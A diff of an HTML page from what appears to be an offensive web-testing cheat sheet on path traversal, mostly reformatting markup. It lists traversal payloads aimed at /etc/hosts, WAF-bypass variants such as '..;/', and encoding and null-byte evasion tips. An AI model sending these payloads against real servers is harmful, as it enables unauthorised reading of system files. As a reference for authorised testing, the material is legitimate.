@@ -35,10 +35,10 @@
 <summary>GENERAL COMMANDS</summary>
 <p><b>DESCRIPTION: </b> Collection of commands to use when testing for path/directory traversal.
 
-<b>C1: </b><p id="DT01"><mark>../../../../etc/hosts</mark></p>
-<b>C2: </b><p id="DT02"><mark>..././.././..././..././..././..././..././..././etc/hosts</mark></p>
+<b>C1: </b><mark id="DT01">../../../../etc/hosts</mark>
+<b>C2: </b><mark id="DT02">..././.././..././..././..././..././..././..././etc/hosts</mark>
 	
-<b>try: </b>
+<b>Try: </b><br>
 * <u>Nullbyte</u> | %00
 * <u>Encoding</u> 
 * <u>Double Encoding</u> 
@@ -48,17 +48,15 @@
 
 <b><u>WAF bypass</u></b>
 
-<b>C3: </b><p id="DT03"><mark>..././etc/hosts</mark></p>
-<b>C4: </b><p id="DT04"><mark>..;/etc/hosts</mark></p>
+<b>C3: </b><mark id="DT03">..././etc/hosts</mark>
+<b>C4: </b><mark id="DT04">..;/etc/hosts</mark>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT03')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DT04')">.C3.</button></p>
 
 </details>
-
 <b>NOTE: </b> All can be tested with 1, 2, or any segments [../] as needed all applications will behave different. If needed, SNIPER ATTACK! (or similar). Also,
 invert the symbol, use backslash and try it. ["..\"]
 
-CHECK THE FOLLOWING LINK, >>> <a href="https://securityheaders.com" target="_blank">FILE SYSTEM</a>
-It can be used to check valuable files per OS.
+CHECK THE FOLLOWING LINK, >>> <a href="https://securityheaders.com" target="_blank">FILE SYSTEM</a> It can be used to check valuable files per OS.
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
